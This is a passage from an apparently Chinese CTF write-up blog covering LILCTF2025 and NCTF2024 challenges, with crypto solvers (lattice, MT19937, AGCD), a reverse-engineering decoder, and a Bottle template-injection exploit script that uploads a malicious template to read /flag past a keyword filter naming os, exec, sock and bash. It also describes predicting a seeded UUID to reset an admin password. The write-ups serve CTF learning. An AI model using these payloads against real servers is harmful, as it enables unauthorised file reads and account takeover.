class="hljs-subst">&#123;b&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ciphertext = <span class="hljs-subst">&#123;ciphertext&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>参考ezbag：<a href="https://naby1.github.io/2025/02/12/hgame2025_1/#ezbag">HGAME2025-Crypto - Naby的博客</a></p><p>就多了个block_size</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> hashlib<br><br>a = <br>b = <br>ciphertext = <br>n=<span class="hljs-number">72</span><br>L=Matrix(ZZ,n+<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    L[i,i]=<span class="hljs-number">2</span><br>    L[i,-<span class="hljs-number">1</span>]=a[-i-<span class="hljs-number">1</span>]<br>L[-<span class="hljs-number">1</span>,:]=<span class="hljs-number">1</span><br>L[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>]=b<br>x=L.BKZ(block_size=<span class="hljs-number">32</span>)<br>p=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x[<span class="hljs-number">0</span>][:n]:<br>    <span class="hljs-keyword">if</span> i==x[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]:<br>        p+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        p+=<span class="hljs-string">&#x27;0&#x27;</span><br>p=<span class="hljs-built_in">int</span>(p,<span class="hljs-number">2</span>)<br><br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(p).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = cipher.decrypt(ciphertext)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="是谁没有阅读参赛须知"><a class="markdownIt-Anchor" href="#是谁没有阅读参赛须知"></a> 是谁没有阅读参赛须知？</h2><p>LILCTF{Me4n1ngFu1_w0rDs}</p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="ez_bottle"><a class="markdownIt-Anchor" href="#ez_bottle"></a> ez_bottle</h2><p>稍微看了下bottle，发现这过滤的基本没过滤，让AI快速搓个交互脚本后，发现卡在怎么回显</p><p>最后在这里发现了可以触发报错</p><p><a href="https://blog.csdn.net/weixin_59166557/article/details/146161897">https://blog.csdn.net/weixin_59166557/article/details/146161897</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> zipfile<br><br>url = <span class="hljs-string">&quot;http://challenge.xinshi.fun:34182/upload&quot;</span>  <span class="hljs-comment"># 替换为目标URL</span><br><br>BLACK_DICT = [<span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;sock&quot;</span>, <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;bul&quot;</span>, <span class="hljs-string">&quot;class&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;:&quot;</span>,<br>               <span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;globals&quot;</span>,<span class="hljs-string">&quot;get&quot;</span>, <span class="hljs-string">&quot;open&quot;</span>]<br><span class="hljs-comment"># 创建一个文件包含恶意tpl的ZIP文件</span><br>exp=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">%import io</span><br><span class="hljs-string">%a=io.FileIO(&#x27;/flag&#x27;,&#x27;r&#x27;).read();raise Exception(a)</span><br><span class="hljs-string">&quot;&quot;&quot;</span>.strip()<br><span class="hljs-keyword">for</span> black <span class="hljs-keyword">in</span> BLACK_DICT:<br>    <span class="hljs-keyword">if</span> black <span class="hljs-keyword">in</span> exp:<br>        <span class="hljs-built_in">print</span>(black)<br>        exit()<br><br><span class="hljs-keyword">with</span> zipfile.ZipFile(<span class="hljs-string">&quot;1.zip&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> zf:<br>    zf.writestr(<span class="hljs-string">&quot;1.tpl&quot;</span>, exp)<br><br><span class="hljs-comment"># 准备恶意ZIP文件</span><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;1.zip&#x27;</span>, <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>), <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#125;<br><br><span class="hljs-comment"># 发送上传请求</span><br>response = requests.post(url, files=files)<br><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-comment"># 提取访问链接</span><br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;/view/([a-f0-9]&#123;32&#125;)/([^&quot;]+)&#x27;</span>, response.text)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        md5_hash = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        filename = <span class="hljs-string">&#x27;1.tpl&#x27;</span><br>        exploit_url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url.rsplit(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]&#125;</span>/view/<span class="hljs-subst">&#123;md5_hash&#125;</span>/<span class="hljs-subst">&#123;filename&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Exploit URL: <span class="hljs-subst">&#123;exploit_url&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-comment"># 触发漏洞读取flag</span><br>        flag_response = requests.get(exploit_url)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Text:\n<span class="hljs-subst">&#123;flag_response.text&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Failed to extract exploit URL from response&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Response content:&quot;</span>, response.text)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Upload failed (HTTP <span class="hljs-subst">&#123;response.status_code&#125;</span>)&quot;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="ekko_note"><a class="markdownIt-Anchor" href="#ekko_note"></a> *Ekko_note</h2><p>只做到了解决uuid8的部分，后面不会了</p><p>通过尝试搜索低版本python的uuid8，刚好发现拉面特徐师傅的博客</p><p><img src="/imgs/LILCTF2025/1.png" alt="1" /></p><p>得到uuid8生成代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">uuid8</span>(<span class="hljs-params">a=<span class="hljs-literal">None</span>, b=<span class="hljs-literal">None</span>, c=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Generate a UUID from three custom blocks.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    * &#x27;a&#x27; is the first 48-bit chunk of the UUID (octets 0-5);</span><br><span class="hljs-string">    * &#x27;b&#x27; is the mid 12-bit chunk (octets 6-7);</span><br><span class="hljs-string">    * &#x27;c&#x27; is the last 62-bit chunk (octets 8-15).</span><br><span class="hljs-string"></span><br><span class="hljs-string">    When a value is not specified, a pseudo-random value is generated.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> a <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">import</span> random<br>        a = random.getrandbits(<span class="hljs-number">48</span>)<br>    <span class="hljs-keyword">if</span> b <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">import</span> random<br>        b = random.getrandbits(<span class="hljs-number">12</span>)<br>    <span class="hljs-keyword">if</span> c <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">import</span> random<br>        c = random.getrandbits(<span class="hljs-number">62</span>)<br>    int_uuid_8 = (a &amp; <span class="hljs-number">0xffff_ffff_ffff</span>) &lt;&lt; <span class="hljs-number">80</span><br>    int_uuid_8 |= (b &amp; <span class="hljs-number">0xfff</span>) &lt;&lt; <span class="hljs-number">64</span><br>    int_uuid_8 |= c &amp; <span class="hljs-number">0x3fff_ffff_ffff_ffff</span><br>    <span class="hljs-comment"># by construction, the variant and version bits are already cleared</span><br>    int_uuid_8 |= _RFC_4122_VERSION_8_FLAGS<br>    <span class="hljs-keyword">return</span> UUID._from_int(int_uuid_8)<br></code></pre></td></tr></table></figure><p>a可知是<code>admin\x00</code></p><p>随机数种子是固定的</p><p>登陆后可以在<code>/server_info</code> 查看到服务器启动时间  <code> random.seed(SERVER_START_TIME)</code></p><p><code>_RFC_4122_VERSION_8_FLAGS</code>的值根据RFC标准<a href="https://www.rfc-editor.org/rfc/rfc9562.html#name-example-of-a-uuidv8-value-n">RFC 9562: Universally Unique IDentifiers (UUIDs)</a></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx</span><br></code></pre></td></tr></table></figure><p>M和N的最高位都为1，换算一下就出来了</p><p>然后就可以修改admin账号的密码了</p><p>后面就不会了</p><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="arm-asm"><a class="markdownIt-Anchor" href="#arm-asm"></a> ARM ASM</h2><p><img src="/imgs/LILCTF2025/2.png" alt="2" /></p><p>有三个看不懂的函数<code>veorq_s8, vqtbl1q_s8, vld1q_dup_s8</code></p><p>通过搜索得知这是neon指令集，简单说就是：</p><p><code>veorq_s8</code>: 异或</p><p><code>vqtbl1q_s8</code>: 取对应索引位置的值</p><p><code>vld1q_dup_s8</code>:  将一个值扩展到（一个寄存器的）所有通道(?) 这里理解就是一个数组</p><p>知道这些就很简单了</p><p>比较坑的就是这base64的表不是常规表，用cyberChef换一下就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>a=<span class="hljs-string">b&#x27;\x92\xb7\x7c\x0b\xbc\x6b\xb2\x39\x7d\x13\xa1\x50\x72\x20\x48\x62\x34\x61\xc3\xb0\x54\xeb\x33\x6d\xca\x35\x72\x5b\xb7\x66\xf2\xb6\x69\x93\xbc\x62\xaa\x33\x67\xf3\x31\x6b\x9b\x2d\x6c\x3b\xaf\x6c&#x27;</span><br>a=<span class="hljs-built_in">bytearray</span>(a)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">3</span>):<br>    a[j]=((a[j]&gt;&gt;<span class="hljs-number">3</span>)|((a[j]&amp;<span class="hljs-number">0x7</span>)&lt;&lt;<span class="hljs-number">5</span>))&amp;<span class="hljs-number">0xff</span><br>    a[j+<span class="hljs-number">1</span>]=((a[j+<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">1</span>)|(a[j+<span class="hljs-number">1</span>]&gt;&gt;<span class="hljs-number">7</span>))&amp;<span class="hljs-number">0xff</span><br><br>t=<span class="hljs-built_in">bytes</span>([<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>])<br>t1=<span class="hljs-built_in">bytes</span>([i^<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> t])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re_table</span>(<span class="hljs-params">a,t</span>):<br>    a=[a[i]^t[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]<br>    <br>    inv_t=[<span class="hljs-number">0</span>]*<span class="hljs-number">16</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        inv_t[t[i]]=i<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([a[inv_t[i]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]).decode()<br><span class="hljs-built_in">print</span>(re_table(a[:<span class="hljs-number">16</span>],t)+re_table(a[<span class="hljs-number">16</span>:<span class="hljs-number">32</span>],t)+re_table(a[<span class="hljs-number">32</span>:],t1))<br><span class="hljs-comment"># LILCTF&#123;ez_arm_asm_meow_meow_meow_meow_meow_meow&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NCTF2024-crypto</title>
    <link href="/2025/03/23/nctf2024/"/>
    <url>/2025/03/23/nctf2024/</url>
    
    <content type="html"><![CDATA[<h1 id="nctf2024-crypto"><a class="markdownIt-Anchor" href="#nctf2024-crypto"></a> NCTF2024-Crypto</h1><p>拼尽全力就写出两题，已经不想思考了，都不难，只是细节(指数据处理)有点麻烦。</p><h2 id="sign"><a class="markdownIt-Anchor" href="#sign"></a> sign</h2><h3 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h3><p><a href="http://srv.py">srv.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> util <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> getenv<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>string = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;secret.txt&#x27;</span>).read().strip().encode()<br>flag = getenv(<span class="hljs-string">&#x27;FLAG&#x27;</span>).encode()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    Keys = []<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> string:<br>        f = FHE()<br>        s = long_to_bytes(Random().getrandbits(<span class="hljs-number">20000</span>))<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s[<span class="hljs-number">4</span>:]:<br>            Keys.extend(f.encrypt([i]))<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s[:<span class="hljs-number">4</span>]:<br>            Keys.extend(f.encrypt([i * (m &amp; <span class="hljs-number">0x03</span>) % <span class="hljs-number">0x101</span>]))<br>            m &gt;&gt;= <span class="hljs-number">2</span><br>        <br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(Keys) == <span class="hljs-number">30000</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[+] Your ciphertext: <span class="hljs-subst">&#123;AES.new(md5(string).digest(),AES.MODE_ECB).encrypt(pad(flag,<span class="hljs-number">16</span>)).<span class="hljs-built_in">hex</span>()&#125;</span>&#x27;</span>)<br>    <span class="hljs-built_in">input</span>(<span class="hljs-string">f&#x27;[+] The keys to retrieve the global internet connection are as follows:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30000</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[+] <span class="hljs-subst">&#123;Keys[i]&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p><a href="http://util.py">util.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> urandom<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getrandint</span>(<span class="hljs-params">n:<span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>.from_bytes(urandom(n//<span class="hljs-number">8</span>+<span class="hljs-number">1</span>)) % <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,n)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FHE</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.p = getPrime(<span class="hljs-number">77</span>)<br>        <span class="hljs-variable language_">self</span>.pubkeys = []<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-variable language_">self</span>.pubkeys.append(<span class="hljs-variable language_">self</span>.p * getrandint(<span class="hljs-number">177</span>) + (getrandint(<span class="hljs-number">17</span>) &lt;&lt; <span class="hljs-number">8</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">self,msg:<span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] | <span class="hljs-built_in">bytes</span></span>):<br>        result = []<br>        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> msg:<br>            tmp = <span class="hljs-number">0</span><br>            shuffle_base = urandom(<span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> shuffle_base:<br>                x,y = <span class="hljs-built_in">divmod</span>(i,<span class="hljs-number">16</span>)<br>                tmp += x*<span class="hljs-variable language_">self</span>.pubkeys[y] + y*<span class="hljs-variable language_">self</span>.pubkeys[x]<br>            result.append(tmp + m)<br>        <span class="hljs-keyword">return</span> result<br></code></pre></td></tr></table></figure><h3 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h3><ol><li><code>s = long_to_bytes(Random().getrandbits(20000))</code>，先生成的32bits在s的低位，总共有625个32bits，而我们需要的m在最高位，即最后生成的32bits。显然我们需要打MT19937预测出最后这一个32bits，前面624*32=19968刚刚好够用，现在就是要解出这前面的19968位</li><li>分析FHE()，通过观察，<code>shuffle_base</code>生成的这十六轮随机无法预测，随意最后结果可以简化为<code>result=p*A+256*B+m</code>，分析得出<code>m=result%p%256</code>,所以我们现在需要求出p</li><li>显然<code>p*A&gt;&gt;256*B&gt;&gt;m</code>，通过AGCD可以求出p，参考<a href="https://hasegawaazusa.github.io/agcd-note.html">AGCD近似最大公约数问题 | 独奏の小屋</a></li><li>打完MT19937后就没什么密码学方面的难点了，主要就是一些数据处理</li></ol><h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> util <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>sh=remote(<span class="hljs-string">&quot;39.106.16.204&quot;</span>,<span class="hljs-number">13589</span>)<br><br>sh.recvuntil(<span class="hljs-string">b&#x27;ciphertext: &#x27;</span>)<br>ciphertext=sh.recvline().strip().decode()<br>sh.recvuntil(<span class="hljs-string">b&#x27; follows:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">b&#x27;&#x27;</span>)<br>Keys=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30000</span>):<br>    sh.recvuntil(<span class="hljs-string">b&#x27;[+] &#x27;</span>)<br>    key=sh.recvline().strip().decode()<br>    Keys.append(<span class="hljs-built_in">int</span>(key))<br><br>sh.close()<br><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(Keys) == <span class="hljs-number">30000</span><br><br>stri=<span class="hljs-string">&quot;&quot;</span><br>RNG = Random()<br>length = <span class="hljs-number">19968</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_a_row</span>(<span class="hljs-params">RNG</span>):<br>    row = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>        t1 = <span class="hljs-built_in">bin</span>(RNG.getrandbits(<span class="hljs-number">32</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">32</span>)<br>        <span class="hljs-keyword">for</span> tt <span class="hljs-keyword">in</span> t1:<br>            row+=tt<br>    <span class="hljs-keyword">return</span> row<br><span class="hljs-string">&quot;&quot;&quot;L = []</span><br><span class="hljs-string">for i in trange(length):</span><br><span class="hljs-string">    state = [0]*624</span><br><span class="hljs-string">    temp = &quot;0&quot;*i + &quot;1&quot;*1 + &quot;0&quot;*(length-1-i)</span><br><span class="hljs-string">    for j in range(624):</span><br><span class="hljs-string">        state[j] = int(temp[32*j:32*j+32],2)</span><br><span class="hljs-string">    RNG.setstate((3,tuple(state+[624]),None))</span><br><span class="hljs-string">    L.append(construct_a_row(RNG))</span><br><span class="hljs-string">L = Matrix(GF(2),L)</span><br><span class="hljs-string">save(L, &quot;matrix.sobj&quot;)&quot;&quot;&quot;</span><br><span class="hljs-comment">#自己测试的时候已经生成好了，这里节省时间</span><br>L = load(<span class="hljs-string">&quot;matrix.sobj&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">30000</span>,<span class="hljs-number">2500</span>):<br><br>    le=<span class="hljs-number">10</span><br>    rho=<span class="hljs-number">22</span><br>    xs=Keys[i:i+le]<br><br>    <span class="hljs-comment">#https://hasegawaazusa.github.io/agcd-note.html</span><br>    A = ZZ(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, rho + <span 